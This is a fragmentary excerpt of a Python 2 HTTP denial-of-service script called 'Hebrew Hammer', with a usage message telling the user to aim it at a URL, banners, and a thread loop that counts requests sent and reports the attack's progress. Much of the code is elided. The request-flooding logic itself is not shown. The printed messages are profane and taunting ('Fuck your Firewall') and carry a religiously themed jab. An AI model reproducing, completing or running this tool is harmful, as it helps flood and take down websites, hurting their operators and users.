...
def usage():
    print 'Hebrew Hammer 1.0 DoS Tool Created By Sanji '
    print 'Sanji DDOs'
    print ''
    print 'Usage: Hammer (url)'
    print 'Example: python2 aa.py http://www.google.com'
    print "\a"
print \
"""
   |||||||   |||||||   ||||| ||||||
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print '#~~~~~~~>      Shabbat Shalom Motherfuckers      <~~~~~~~#'
 			print '#~~~~~~~>           Fuck your Firewall           <~~~~~~~#'
 			print '                                                                    '
			code=500
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>Hebrew Hammer Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>Stopping the Attack<~"
